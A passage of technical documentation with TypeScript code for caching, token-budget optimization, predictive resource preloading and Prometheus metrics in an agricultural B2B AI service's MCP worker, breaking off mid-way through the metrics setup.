    config?: Partial<MemoryCacheConfig>;
    logger: Logger;
  }) {
    super();
    this.logger = options.logger.child({ component: 'MemoryCache' });
    
    this.config = {
      maxEntries: 10000,
      maxSize: 100 * 1024 * 1024, // 100MB
      defaultTtl: 300000, // 5 minutes
      cleanupInterval: 60000, // 1 minute
      enableStats: true,
      ...options.config
    };
    
    this.stats = {
      hits: 0,
      misses: 0,
      sets: 0,
      deletes: 0,
      evictions: 0,
      currentEntries: 0,
      currentSize: 0,
      hitRate: 0
    };
    
    this.startCleanup();
  }
  
  /**
   * Get value from cache
   */
  get(key: string): T | undefined {
    const entry = this.cache.get(key);
    
    if (!entry) {
      if (this.config.enableStats) {
        this.stats.misses++;
        this.updateHitRate();
      }
      return undefined;
    }
    
    // Check expiration
    if (Date.now() > entry.expiresAt) {
      this.delete(key);
      if (this.config.enableStats) {
        this.stats.misses++;
        this.updateHitRate();
      }
      return undefined;
    }
    
    // Update access tracking for LRU
    entry.accessCount++;
    entry.lastAccess = Date.now();
    this.moveToEnd(key);
    
    if (this.config.enableStats) {
      this.stats.hits++;
      this.updateHitRate();
    }
    
    return entry.value;
  }
  
  /**
   * Set value in cache
   */
  set(key: string, value: T, ttl?: number): void {
    const size = this.estimateSize(value);
    const expiresAt = Date.now() + (ttl || this.config.defaultTtl);
    
    // Check if we need to evict
    while (
      (this.cache.size >= this.config.maxEntries || 
       this.stats.currentSize + size > this.config.maxSize) &&
      this.cache.size > 0
    ) {
      this.evictOne();
    }
    
    // Update existing entry
    if (this.cache.has(key)) {
      const existing = this.cache.get(key)!;
      this.stats.currentSize -= existing.size;
      this.moveToEnd(key);
    } else {
      this.accessOrder.push(key);
    }
    
    // Add entry
    this.cache.set(key, {
      value,
      expiresAt,
      size,
      accessCount: 1,
      lastAccess: Date.now()
    });
    
    this.stats.currentSize += size;
    this.stats.currentEntries = this.cache.size;
    
    if (this.config.enableStats) {
      this.stats.sets++;
    }
    
    this.emit('set', { key, size, ttl: ttl || this.config.defaultTtl });
  }
  
  /**
   * Delete value from cache
   */
  delete(key: string): boolean {
    const entry = this.cache.get(key);
    
    if (!entry) {
      return false;
    }
    
    this.cache.delete(key);
    this.stats.currentSize -= entry.size;
    this.stats.currentEntries = this.cache.size;
    this.removeFromOrder(key);
    
    if (this.config.enableStats) {
      this.stats.deletes++;
    }
    
    this.emit('delete', { key });
    return true;
  }
  
  /**
   * Check if key exists
   */
  has(key: string): boolean {
    const entry = this.cache.get(key);
    if (!entry) return false;
    if (Date.now() > entry.expiresAt) {
      this.delete(key);
      return false;
    }
    return true;
  }
  
  /**
   * Clear all entries
   */
  clear(): void {
    this.cache.clear();
    this.accessOrder = [];
    this.stats.currentEntries = 0;
    this.stats.currentSize = 0;
    this.emit('clear');
  }
  
  /**
   * Get multiple values
   */
  mget(keys: string[]): Map<string, T> {
    const results = new Map<string, T>();
    
    for (const key of keys) {
      const value = this.get(key);
      if (value !== undefined) {
        results.set(key, value);
      }
    }
    
    return results;
  }
  
  /**
   * Set multiple values
   */
  mset(entries: Array<{ key: string; value: T; ttl?: number }>): void {
    for (const { key, value, ttl } of entries) {
      this.set(key, value, ttl);
    }
  }
  
  /**
   * Get or set (cache-aside pattern)
   */
  async getOrSet(
    key: string,
    loader: () => Promise<T>,
    ttl?: number
  ): Promise<T> {
    const cached = this.get(key);
    if (cached !== undefined) {
      return cached;
    }
    
    const value = await loader();
    this.set(key, value, ttl);
    return value;
  }
  
  /**
   * Get cache statistics
   */
  getStats(): CacheStats {
    return { ...this.stats };
  }
  
  /**
   * Get all keys (for debugging)
   */
  keys(): string[] {
    return Array.from(this.cache.keys());
  }
  
  /**
   * Get cache size info
   */
  getSizeInfo(): {
    entries: number;
    sizeBytes: number;
    maxEntries: number;
    maxSizeBytes: number;
  } {
    return {
      entries: this.cache.size,
      sizeBytes: this.stats.currentSize,
      maxEntries: this.config.maxEntries,
      maxSizeBytes: this.config.maxSize
    };
  }
  
  /**
   * Evict one entry (LRU)
   */
  private evictOne(): void {
    if (this.accessOrder.length === 0) return;
    
    // Find and remove least recently used
    const keyToEvict = this.accessOrder[0];
    const entry = this.cache.get(keyToEvict);
    
    if (entry) {
      this.cache.delete(keyToEvict);
      this.stats.currentSize -= entry.size;
      this.stats.currentEntries = this.cache.size;
      
      if (this.config.enableStats) {
        this.stats.evictions++;
      }
      
      this.emit('evict', { key: keyToEvict, reason: 'lru' });
    }
    
    this.accessOrder.shift();
  }
  
  /**
   * Move key to end of access order
   */
  private moveToEnd(key: string): void {
    const index = this.accessOrder.indexOf(key);
    if (index > -1) {
      this.accessOrder.splice(index, 1);
      this.accessOrder.push(key);
    }
  }
  
  /**
   * Remove key from access order
   */
  private removeFromOrder(key: string): void {
    const index = this.accessOrder.indexOf(key);
    if (index > -1) {
      this.accessOrder.splice(index, 1);
    }
  }
  
  /**
   * Estimate size of value in bytes
   */
  private estimateSize(value: T): number {
    if (value === null || value === undefined) return 0;
    
    if (typeof value === 'string') {
      return value.length * 2; // UTF-16
    }
    
    if (typeof value === 'number') {
      return 8;
    }
    
    if (typeof value === 'boolean') {
      return 4;
    }
    
    if (Buffer.isBuffer(value)) {
      return value.length;
    }
    
    // For objects, use JSON serialization
    try {
      return JSON.stringify(value).length * 2;
    } catch {
      return 1024; // Default estimate
    }
  }
  
  /**
   * Update hit rate
   */
  private updateHitRate(): void {
    const total = this.stats.hits + this.stats.misses;
    this.stats.hitRate = total > 0 ? this.stats.hits / total : 0;
  }
  
  /**
   * Start cleanup timer
   */
  private startCleanup(): void {
    this.cleanupTimer = setInterval(() => {
      this.cleanupExpired();
    }, this.config.cleanupInterval);
  }
  
  /**
   * Cleanup expired entries
   */
  private cleanupExpired(): void {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [key, entry] of this.cache) {
      if (now > entry.expiresAt) {
        this.delete(key);
        cleaned++;
      }
    }
    
    if (cleaned > 0) {
      this.logger.debug({ cleaned }, 'Cleaned up expired cache entries');
    }
  }
  
  /**
   * Shutdown cache
   */
  shutdown(): void {
    if (this.cleanupTimer) {
      clearInterval(this.cleanupTimer);
      this.cleanupTimer = null;
    }
    this.clear();
  }
}
```

### 7.3 Redis Cache Manager

```typescript
// src/workers/mcp/cache/redis-cache-manager.ts

import { Redis, Pipeline } from 'ioredis';
import { Logger } from 'pino';
import { EventEmitter } from 'events';

/**
 * Redis Cache Manager
 * Manages distributed caching with Redis
 */

interface RedisCacheConfig {
  defaultTtl: number; // seconds
  keyPrefix: string;
  enableCompression: boolean;
  compressionThreshold: number; // bytes
  maxRetries: number;
}

interface CacheNamespace {
  name: string;
  ttl: number;
  keyPattern: string;
}

export class RedisCacheManager extends EventEmitter {
  private redis: Redis;
  private subscriber: Redis;
  private logger: Logger;
  private config: RedisCacheConfig;
  
  // Predefined namespaces
  private namespaces: Map<string, CacheNamespace> = new Map([
    ['session', { name: 'session', ttl: 3600, keyPattern: 'mcp:session:*' }],
    ['resource', { name: 'resource', ttl: 300, keyPattern: 'mcp:resource:*' }],
    ['tool', { name: 'tool', ttl: 600, keyPattern: 'mcp:tool:*' }],
    ['product', { name: 'product', ttl: 300, keyPattern: 'mcp:product:*' }],
    ['client', { name: 'client', ttl: 600, keyPattern: 'mcp:client:*' }],
    ['conversation', { name: 'conversation', ttl: 1800, keyPattern: 'mcp:conversation:*' }],
    ['analysis', { name: 'analysis', ttl: 60, keyPattern: 'mcp:analysis:*' }]
  ]);
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
    config?: Partial<RedisCacheConfig>;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'RedisCacheManager' });
    
    this.config = {
      defaultTtl: 300,
      keyPrefix: 'mcp:',
      enableCompression: true,
      compressionThreshold: 1024,
      maxRetries: 3,
      ...options.config
    };
    
    this.setupSubscriber();
  }
  
  /**
   * Setup Redis subscriber for cache invalidation
   */
  private setupSubscriber(): void {
    this.subscriber = this.redis.duplicate();
    
    this.subscriber.subscribe('cache:invalidate', (err) => {
      if (err) {
        this.logger.error({ error: err }, 'Failed to subscribe to cache invalidation');
        return;
      }
    });
    
    this.subscriber.on('message', async (channel, message) => {
      if (channel === 'cache:invalidate') {
        try {
          const { pattern, namespace, reason } = JSON.parse(message);
          await this.invalidatePattern(pattern);
          this.emit('invalidated', { pattern, namespace, reason });
        } catch (error) {
          this.logger.error({ error }, 'Error handling cache invalidation');
        }
      }
    });
  }
  
  /**
   * Get value from cache
   */
  async get<T>(key: string): Promise<T | null> {
    const fullKey = this.buildKey(key);
    
    try {
      const value = await this.redis.get(fullKey);
      
      if (!value) {
        return null;
      }
      
      return this.deserialize<T>(value);
      
    } catch (error) {
      this.logger.error({ error, key }, 'Error getting cache value');
      return null;
    }
  }
  
  /**
   * Set value in cache
   */
  async set<T>(
    key: string,
    value: T,
    ttl?: number,
    namespace?: string
  ): Promise<boolean> {
    const fullKey = this.buildKey(key);
    const effectiveTtl = ttl || this.getNamespaceTtl(namespace);
    
    try {
      const serialized = this.serialize(value);
      
      await this.redis.setex(fullKey, effectiveTtl, serialized);
      
      this.emit('set', { key: fullKey, ttl: effectiveTtl });
      return true;
      
    } catch (error) {
      this.logger.error({ error, key }, 'Error setting cache value');
      return false;
    }
  }
  
  /**
   * Delete value from cache
   */
  async delete(key: string): Promise<boolean> {
    const fullKey = this.buildKey(key);
    
    try {
      await this.redis.del(fullKey);
      this.emit('delete', { key: fullKey });
      return true;
      
    } catch (error) {
      this.logger.error({ error, key }, 'Error deleting cache value');
      return false;
    }
  }
  
  /**
   * Check if key exists
   */
  async has(key: string): Promise<boolean> {
    const fullKey = this.buildKey(key);
    return (await this.redis.exists(fullKey)) === 1;
  }
  
  /**
   * Get multiple values
   */
  async mget<T>(keys: string[]): Promise<Map<string, T>> {
    const fullKeys = keys.map(k => this.buildKey(k));
    const results = new Map<string, T>();
    
    try {
      const values = await this.redis.mget(...fullKeys);
      
      for (let i = 0; i < keys.length; i++) {
        if (values[i]) {
          results.set(keys[i], this.deserialize<T>(values[i]));
        }
      }
      
      return results;
      
    } catch (error) {
      this.logger.error({ error }, 'Error getting multiple cache values');
      return results;
    }
  }
  
  /**
   * Set multiple values
   */
  async mset<T>(
    entries: Array<{ key: string; value: T; ttl?: number }>
  ): Promise<boolean> {
    const pipeline: Pipeline = this.redis.pipeline();
    
    for (const { key, value, ttl } of entries) {
      const fullKey = this.buildKey(key);
      const serialized = this.serialize(value);
      const effectiveTtl = ttl || this.config.defaultTtl;
      
      pipeline.setex(fullKey, effectiveTtl, serialized);
    }
    
    try {
      await pipeline.exec();
      return true;
      
    } catch (error) {
      this.logger.error({ error }, 'Error setting multiple cache values');
      return false;
    }
  }
  
  /**
   * Get or set (cache-aside pattern)
   */
  async getOrSet<T>(
    key: string,
    loader: () => Promise<T>,
    ttl?: number,
    namespace?: string
  ): Promise<T> {
    // Try cache first
    const cached = await this.get<T>(key);
    if (cached !== null) {
      return cached;
    }
    
    // Load fresh value
    const value = await loader();
    
    // Cache it
    await this.set(key, value, ttl, namespace);
    
    return value;
  }
  
  /**
   * Invalidate by pattern
   */
  async invalidatePattern(pattern: string): Promise<number> {
    const fullPattern = this.buildKey(pattern);
    
    try {
      const keys = await this.redis.keys(fullPattern);
      
      if (keys.length === 0) {
        return 0;
      }
      
      await this.redis.del(...keys);
      
      this.logger.debug({
        pattern: fullPattern,
        count: keys.length
      }, 'Invalidated cache pattern');
      
      return keys.length;
      
    } catch (error) {
      this.logger.error({ error, pattern }, 'Error invalidating cache pattern');
      return 0;
    }
  }
  
  /**
   * Invalidate by namespace
   */
  async invalidateNamespace(namespaceName: string): Promise<number> {
    const namespace = this.namespaces.get(namespaceName);
    
    if (!namespace) {
      this.logger.warn({ namespace: namespaceName }, 'Unknown namespace');
      return 0;
    }
    
    return await this.invalidatePattern(namespace.keyPattern);
  }
  
  /**
   * Publish invalidation event
   */
  async publishInvalidation(
    pattern: string,
    namespace?: string,
    reason?: string
  ): Promise<void> {
    await this.redis.publish('cache:invalidate', JSON.stringify({
      pattern,
      namespace,
      reason,
      timestamp: Date.now()
    }));
  }
  
  /**
   * Get cache statistics
   */
  async getStats(): Promise<{
    keyCount: number;
    memoryUsage: number;
    hitRate: number;
    namespaceStats: Array<{
      namespace: string;
      keyCount: number;
    }>;
  }> {
    const info = await this.redis.info('memory');
    const memoryMatch = info.match(/used_memory:(\d+)/);
    const memoryUsage = memoryMatch ? parseInt(memoryMatch[1]) : 0;
    
    const namespaceStats: Array<{ namespace: string; keyCount: number }> = [];
    
    for (const [name, ns] of this.namespaces) {
      const keys = await this.redis.keys(ns.keyPattern);
      namespaceStats.push({
        namespace: name,
        keyCount: keys.length
      });
    }
    
    const totalKeys = namespaceStats.reduce((sum, ns) => sum + ns.keyCount, 0);
    
    return {
      keyCount: totalKeys,
      memoryUsage,
      hitRate: 0, // Would need Redis keyspace stats
      namespaceStats
    };
  }
  
  /**
   * Build full key with prefix
   */
  private buildKey(key: string): string {
    if (key.startsWith(this.config.keyPrefix)) {
      return key;
    }
    return `${this.config.keyPrefix}${key}`;
  }
  
  /**
   * Get TTL for namespace
   */
  private getNamespaceTtl(namespace?: string): number {
    if (namespace) {
      const ns = this.namespaces.get(namespace);
      if (ns) {
        return ns.ttl;
      }
    }
    return this.config.defaultTtl;
  }
  
  /**
   * Serialize value
   */
  private serialize<T>(value: T): string {
    const json = JSON.stringify(value);
    
    // Compress if enabled and over threshold
    if (this.config.enableCompression && 
        json.length > this.config.compressionThreshold) {
      // Would use zlib compression here
      // For now, just return JSON
      return json;
    }
    
    return json;
  }
  
  /**
   * Deserialize value
   */
  private deserialize<T>(value: string): T {
    // Handle decompression if needed
    return JSON.parse(value);
  }
  
  /**
   * Cleanup
   */
  async shutdown(): Promise<void> {
    await this.subscriber.unsubscribe('cache:invalidate');
    this.subscriber.disconnect();
    this.logger.info('Redis Cache Manager shut down');
  }
}
```

### 7.4 Token Optimization

```typescript
// src/workers/mcp/performance/token-optimizer.ts

import { Logger } from 'pino';

/**
 * Token Optimizer
 * Optimizes token usage for LLM interactions
 */

interface TokenBudget {
  maxInput: number;
  maxOutput: number;
  reserveForTools: number;
  reserveForSystem: number;
}

interface ContentPriority {
  content: string;
  priority: number; // 1-10, higher = more important
  category: 'system' | 'context' | 'history' | 'tool_result' | 'user';
  compressible: boolean;
  minTokens?: number;
}

interface OptimizedContent {
  content: string;
  tokenCount: number;
  removedItems: Array<{
    category: string;
    tokens: number;
    reason: string;
  }>;
  compressionRatio: number;
}

export class TokenOptimizer {
  private logger: Logger;
  
  // Token estimation factors
  private readonly avgCharsPerToken = 4;
  private readonly tokenOverhead = 1.1; // 10% overhead for encoding
  
  constructor(options: { logger: Logger }) {
    this.logger = options.logger.child({ component: 'TokenOptimizer' });
  }
  
  /**
   * Estimate token count for text
   */
  estimateTokens(text: string): number {
    if (!text) return 0;
    
    // Basic estimation: ~4 characters per token on average
    // With overhead for special characters and encoding
    const baseEstimate = Math.ceil(text.length / this.avgCharsPerToken);
    return Math.ceil(baseEstimate * this.tokenOverhead);
  }
  
  /**
   * Optimize content to fit token budget
   */
  optimizeForBudget(
    contents: ContentPriority[],
    budget: TokenBudget
  ): OptimizedContent {
    // Calculate available budget
    const availableBudget = budget.maxInput - 
      budget.reserveForTools - 
      budget.reserveForSystem;
    
    // Sort by priority (descending)
    const sorted = [...contents].sort((a, b) => b.priority - a.priority);
    
    const included: ContentPriority[] = [];
    const removed: Array<{ category: string; tokens: number; reason: string }> = [];
    let totalTokens = 0;
    
    // First pass: include all high-priority items
    for (const item of sorted) {
      const tokens = this.estimateTokens(item.content);
      
      // Always include priority 10 items
      if (item.priority >= 10) {
        included.push(item);
        totalTokens += tokens;
        continue;
      }
      
      // Check if fits in budget
      if (totalTokens + tokens <= availableBudget) {
        included.push(item);
        totalTokens += tokens;
      } else if (item.compressible) {
        // Try compression
        const compressed = this.compressContent(
          item,
          availableBudget - totalTokens
        );
        
        if (compressed) {
          included.push({
            ...item,
            content: compressed.content
          });
          totalTokens += compressed.tokens;
        } else {
          removed.push({
            category: item.category,
            tokens,
            reason: 'over_budget'
          });
        }
      } else {
        removed.push({
          category: item.category,
          tokens,
          reason: 'over_budget_not_compressible'
        });
      }
    }
    
    // Build final content
    const finalContent = included.map(i => i.content).join('\n\n');
    const originalTokens = contents.reduce(
      (sum, c) => sum + this.estimateTokens(c.content),
      0
    );
    
    return {
      content: finalContent,
      tokenCount: totalTokens,
      removedItems: removed,
      compressionRatio: totalTokens / originalTokens
    };
  }
  
  /**
   * Compress content to fit token limit
   */
  compressContent(
    item: ContentPriority,
    maxTokens: number
  ): { content: string; tokens: number } | null {
    if (item.minTokens && maxTokens < item.minTokens) {
      return null;
    }
    
    const original = item.content;
    let compressed = original;
    
    switch (item.category) {
      case 'history':
        compressed = this.compressHistory(original, maxTokens);
        break;
      case 'tool_result':
        compressed = this.compressToolResult(original, maxTokens);
        break;
      case 'context':
        compressed = this.compressContext(original, maxTokens);
        break;
      default:
        compressed = this.truncateText(original, maxTokens);
    }
    
    const tokens = this.estimateTokens(compressed);
    
    if (tokens <= maxTokens) {
      return { content: compressed, tokens };
    }
    
    return null;
  }
  
  /**
   * Compress conversation history
   */
  private compressHistory(content: string, maxTokens: number): string {
    const lines = content.split('\n');
    
    // Keep first and last exchanges, summarize middle
    if (lines.length <= 4) {
      return this.truncateText(content, maxTokens);
    }
    
    const first = lines.slice(0, 2);
    const last = lines.slice(-2);
    const middle = lines.slice(2, -2);
    
    const summary = `[...${middle.length} messages summarized...]`;
    
    return [...first, summary, ...last].join('\n');
  }
  
  /**
   * Compress tool result
   */
  private compressToolResult(content: string, maxTokens: number): string {
    try {
      const parsed = JSON.parse(content);
      
      // If array, limit items
      if (Array.isArray(parsed)) {
        const maxItems = Math.floor(maxTokens / 50); // Estimate 50 tokens per item
        const truncated = parsed.slice(0, Math.max(3, maxItems));
        
        if (truncated.length < parsed.length) {
          return JSON.stringify({
            items: truncated,
            _truncated: true,
            _totalCount: parsed.length
          });
        }
      }
      
      // Remove nested details if object
      if (typeof parsed === 'object') {
        return JSON.stringify(this.flattenObject(parsed));
      }
      
      return content;
      
    } catch {
      return this.truncateText(content, maxTokens);
    }
  }
  
  /**
   * Compress context
   */
  private compressContext(content: string, maxTokens: number): string {
    // Extract key-value pairs and summarize
    const lines = content.split('\n').filter(l => l.trim());
    const targetLines = Math.floor(maxTokens / 15); // ~15 tokens per line
    
    if (lines.length <= targetLines) {
      return content;
    }
    
    // Keep most important lines (those with key indicators)
    const important = lines.filter(l => 
      l.includes(':') || 
      l.includes('=') ||
      l.toLowerCase().includes('important') ||
      l.toLowerCase().includes('customer') ||
      l.toLowerCase().includes('product')
    );
    
    return important.slice(0, targetLines).join('\n');
  }
  
  /**
   * Truncate text to token limit
   */
  private truncateText(text: string, maxTokens: number): string {
    const maxChars = maxTokens * this.avgCharsPerToken * 0.9; // 10% safety margin
    
    if (text.length <= maxChars) {
      return text;
    }
    
    // Try to truncate at sentence boundary
    const truncated = text.substring(0, maxChars);
    const lastPeriod = truncated.lastIndexOf('.');
    const lastNewline = truncated.lastIndexOf('\n');
    
    const breakPoint = Math.max(lastPeriod, lastNewline);
    
    if (breakPoint > maxChars * 0.7) {
      return truncated.substring(0, breakPoint + 1) + '\n[...truncated]';
    }
    
    return truncated + '...[truncated]';
  }
  
  /**
   * Flatten object for compression
   */
  private flattenObject(obj: any, maxDepth: number = 1): any {
    if (maxDepth === 0 || typeof obj !== 'object' || obj === null) {
      if (typeof obj === 'string' && obj.length > 100) {
        return obj.substring(0, 100) + '...';
      }
      return obj;
    }
    
    if (Array.isArray(obj)) {
      return obj.slice(0, 5).map(item => this.flattenObject(item, maxDepth - 1));
    }
    
    const result: any = {};
    const keys = Object.keys(obj).slice(0, 10);
    
    for (const key of keys) {
      result[key] = this.flattenObject(obj[key], maxDepth - 1);
    }
    
    return result;
  }
  
  /**
   * Calculate optimal distribution of tokens
   */
  calculateOptimalDistribution(
    totalBudget: number,
    requirements: {
      systemPrompt: number;
      context: number;
      history: number;
      toolResults: number;
      responseReserve: number;
    }
  ): {
    system: number;
    context: number;
    history: number;
    tools: number;
    response: number;
  } {
    const total = Object.values(requirements).reduce((a, b) => a + b, 0);
    
    if (total <= totalBudget) {
      return {
        system: requirements.systemPrompt,
        context: requirements.context,
        history: requirements.history,
        tools: requirements.toolResults,
        response: requirements.responseReserve
      };
    }
    
    // Need to reduce - prioritize system and response
    const scale = totalBudget / total;
    
    return {
      system: requirements.systemPrompt, // Never compress system
      context: Math.floor(requirements.context * scale),
      history: Math.floor(requirements.history * scale * 0.8), // Reduce history more
      tools: Math.floor(requirements.toolResults * scale),
      response: requirements.responseReserve // Never compress response
    };
  }
}
```

### 7.5 Resource Preloading

```typescript
// src/workers/mcp/performance/resource-preloader.ts

import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { Queue } from 'bullmq';

/**
 * Resource Preloader
 * Predictively loads resources before they're needed
 */

interface PreloadConfig {
  enabled: boolean;
  maxConcurrent: number;
  predictionThreshold: number; // 0-1
  preloadTtl: number; // seconds
}

interface PreloadPrediction {
  resourceUri: string;
  probability: number;
  basedOn: string;
}

interface PredictionModel {
  // Transition probabilities between resources
  transitions: Map<string, Map<string, number>>;
  // Common resource sequences
  sequences: Map<string, string[]>;
  // Intent to resource mapping
  intentResources: Map<string, string[]>;
}

export class ResourcePreloader {
  private redis: Redis;
  private logger: Logger;
  private resourceQueue: Queue;
  private config: PreloadConfig;
  
  // Prediction model
  private model: PredictionModel = {
    transitions: new Map(),
    sequences: new Map(),
    intentResources: new Map()
  };
  
  // Active preloads
  private activePreloads: Set<string> = new Set();
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
    config?: Partial<PreloadConfig>;
  }) {
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'ResourcePreloader' });
    
    this.config = {
      enabled: true,
      maxConcurrent: 10,
      predictionThreshold: 0.5,
      preloadTtl: 300,
      ...options.config
    };
    
    this.resourceQueue = new Queue('mcp:resource:load', {
      connection: this.redis
    });
    
    this.initializePredictionModel();
  }
  
  /**
   * Initialize prediction model with common patterns
   */
  private initializePredictionModel(): void {
    // Common intent -> resource mappings for agricultural B2B
    this.model.intentResources = new Map([
      ['product_inquiry', [
        'cerniq://products/search',
        'cerniq://catalogs/default'
      ]],
      ['price_check', [
        'cerniq://products/search',
        'cerniq://clients/current'
      ]],
      ['order_status', [
        'cerniq://orders/recent',
        'cerniq://clients/current'
      ]],
      ['complaint', [
        'cerniq://clients/current',
        'cerniq://conversations/history'
      ]],
      ['recommendation', [
        'cerniq://products/search',
        'cerniq://clients/current',
        'cerniq://catalogs/default'
      ]]
    ]);
    
    // Common resource sequences
    this.model.sequences = new Map([
      ['product_purchase', [
        'cerniq://products/search',
        'cerniq://products/{id}',
        'cerniq://clients/current',
        'cerniq://quotes/create'
      ]],
      ['support_flow', [
        'cerniq://clients/current',
        'cerniq://orders/recent',
        'cerniq://conversations/history'
      ]]
    ]);
  }
  
  /**
   * Predict and preload resources based on current state
   */
  async predictAndPreload(
    sessionId: string,
    tenantId: string,
    currentState: {
      intent?: string;
      lastResource?: string;
      conversationStage?: string;
    }
  ): Promise<void> {
    if (!this.config.enabled) return;
    
    const predictions = this.predictNextResources(currentState);
    
    // Filter by threshold and limit concurrent
    const toPreload = predictions
      .filter(p => p.probability >= this.config.predictionThreshold)
      .slice(0, this.config.maxConcurrent - this.activePreloads.size);
    
    for (const prediction of toPreload) {
      if (!this.activePreloads.has(prediction.resourceUri)) {
        this.preloadResource(prediction.resourceUri, tenantId, sessionId);
      }
    }
  }
  
  /**
   * Predict next resources based on current state
   */
  private predictNextResources(state: {
    intent?: string;
    lastResource?: string;
    conversationStage?: string;
  }): PreloadPrediction[] {
    const predictions: PreloadPrediction[] = [];
    
    // Predict from intent
    if (state.intent) {
      const intentResources = this.model.intentResources.get(state.intent);
      if (intentResources) {
        for (const uri of intentResources) {
          predictions.push({
            resourceUri: uri,
            probability: 0.8,
            basedOn: `intent:${state.intent}`
          });
        }
      }
    }
    
    // Predict from last resource (transition probability)
    if (state.lastResource) {
      const transitions = this.model.transitions.get(state.lastResource);
      if (transitions) {
        for (const [uri, prob] of transitions) {
          predictions.push({
            resourceUri: uri,
            probability: prob,
            basedOn: `transition:${state.lastResource}`
          });
        }
      }
    }
    
    // Deduplicate and sort by probability
    const seen = new Set<string>();
    return predictions
      .filter(p => {
        if (seen.has(p.resourceUri)) return false;
        seen.add(p.resourceUri);
        return true;
      })
      .sort((a, b) => b.probability - a.probability);
  }
  
  /**
   * Preload a specific resource
   */
  private async preloadResource(
    uri: string,
    tenantId: string,
    sessionId: string
  ): Promise<void> {
    this.activePreloads.add(uri);
    
    try {
      await this.resourceQueue.add('preload', {
        tenantId,
        uri,
        options: {
          cacheTtl: this.config.preloadTtl,
          priority: 'low'
        },
        requestId: `preload-${Date.now()}`,
        sessionId
      }, {
        priority: 10, // Low priority
        removeOnComplete: true,
        removeOnFail: true
      });
      
      this.logger.debug({ uri }, 'Resource preload initiated');
      
    } catch (error) {
      this.logger.error({ error, uri }, 'Failed to preload resource');
    } finally {
      // Remove from active after delay
      setTimeout(() => {
        this.activePreloads.delete(uri);
      }, 5000);
    }
  }
  
  /**
   * Update prediction model with observed behavior
   */
  updateModel(
    fromResource: string,
    toResource: string,
    intent?: string
  ): void {
    // Update transition probabilities
    if (!this.model.transitions.has(fromResource)) {
      this.model.transitions.set(fromResource, new Map());
    }
    
    const transitions = this.model.transitions.get(fromResource)!;
    const currentProb = transitions.get(toResource) || 0;
    
    // Simple exponential moving average
    const alpha = 0.1;
    transitions.set(toResource, currentProb + alpha * (1 - currentProb));
    
    // Decay other transitions
    for (const [uri, prob] of transitions) {
      if (uri !== toResource) {
        transitions.set(uri, prob * (1 - alpha));
      }
    }
    
    // Update intent resources
    if (intent && !this.model.intentResources.get(intent)?.includes(toResource)) {
      const resources = this.model.intentResources.get(intent) || [];
      resources.push(toResource);
      this.model.intentResources.set(intent, resources.slice(-10)); // Keep last 10
    }
  }
  
  /**
   * Warm up cache with common resources
   */
  async warmupCache(tenantId: string): Promise<void> {
    const commonResources = [
      'cerniq://catalogs/default',
      'cerniq://products/popular',
      'cerniq://categories/all'
    ];
    
    for (const uri of commonResources) {
      await this.preloadResource(uri, tenantId, 'warmup');
    }
    
    this.logger.info({ tenantId }, 'Cache warmup initiated');
  }
  
  /**
   * Get preload statistics
   */
  getStats(): {
    activePreloads: number;
    modelSize: {
      transitions: number;
      sequences: number;
      intentResources: number;
    };
  } {
    return {
      activePreloads: this.activePreloads.size,
      modelSize: {
        transitions: this.model.transitions.size,
        sequences: this.model.sequences.size,
        intentResources: this.model.intentResources.size
      }
    };
  }
}
```

### 7.6 Performance Metrics

```typescript
// src/workers/mcp/performance/metrics-collector.ts

import { Registry, Counter, Histogram, Gauge } from 'prom-client';
import { Logger } from 'pino';

/**
 * MCP Performance Metrics Collector
 * Collects and exposes performance metrics for monitoring
 */

interface MetricsConfig {
  prefix: string;
  defaultLabels: Record<string, string>;
  buckets: {
    latency: number[];
    tokens: number[];
  };
}

export class MCPMetricsCollector {
  private registry: Registry;
  private logger: Logger;
  private config: MetricsConfig;
  
  // Counters
  private requestCounter: Counter;
  private errorCounter: Counter;
  private cacheHitCounter: Counter;
  private cacheMissCounter: Counter;
  private tokenCounter: Counter;
  
  // Histograms
  private requestLatency: Histogram;
  private resourceLoadLatency: Histogram;
  private toolExecutionLatency: Histogram;
  private tokenUsage: Histogram;
  
  // Gauges
  private activeSessions: Gauge;
  private cacheSize: Gauge;
  private queueDepth: Gauge;
  private circuitBreakerStatus: Gauge;
  
  constructor(options: {
    logger: Logger;
    config?: Partial<MetricsConfig>;
  }) {
    this.logger = options.logger.child({ component: 'MCPMetrics' });
    
    this.config = {
      prefix: 'mcp_',
      defaultLabels: {},
      buckets: {
        latency: [0.01, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10],
        tokens: [100, 500, 1000, 2000, 4000, 8000, 16000, 32000]
      },
      ...options.config
    };
    
    this.registry = new Registry();
    this.registry.setDefaultLabels(this.config.defaultLabels);
    
    this.initializeMetrics();
  }
  
  private initializeMetrics(): void {
    // Request counter
    this.requestCounter = new Counter({
      name: `${this.config.prefix}requests_total`,
      help: 'Total number of MCP requests',
      labelNames: ['method', 'status', 'tenant_id'],
      registers: [this.registry]
    });
    
    // Error counter
    this.errorCounter = new Counter({
      name: `${this.config.prefix}errors_total`,
      help: 'Total number of MCP errors',
      labelNames: ['type', 'method', 'tenant_id'],
      registers: [this.registry]
    });
    
    // Cache counters
    this.cacheHitCounter = new Counter({
      name: `${this.config.prefix}cache_hits_total`,
      help: 'Total cache hits',
      labelNames: ['cache_type', 'namespace'],
      registers: [this.registry]
    });
    
    this.cacheMissCounter = new Counter({
      name: `${this.config.prefix}cache_misses_total`,
      help: 'Total cache misses',
      labelNames: ['cache_type', 'namespace'],
      registers: [this.registry]
    });
    
    // Token counter
    this.tokenCounter = new Counter({
      name: `${this.config.prefix}tokens_used_total`,
      help: 'Total tokens used',
      labelNames: ['type', 'tenant_id'],
      registers: [this.registry]
    });
    
    // Request latency histogram
    this.requestLatency = new Histogram({
      name: `${this.config.prefix}request_duration_seconds`,
      help: 'Request duration in seconds',
      labelNames: ['method', 'status'],
      buckets: this.config.buckets.latency,
      registers: [this.registry]
    });
    
    // Resource load latency
    this.resourceLoadLatency = new Histogram({
      name: `${this.config.prefix}resource_load_duration_seconds`,
      help: 'Resource load duration in seconds',
      labelNames: ['resource_type', 'cached'],
      buckets: this.config.buckets.latency,
      registers: [this.registry]
    });
    
    // Tool execution latency
    this.toolExecutionLatency = new Histogram({
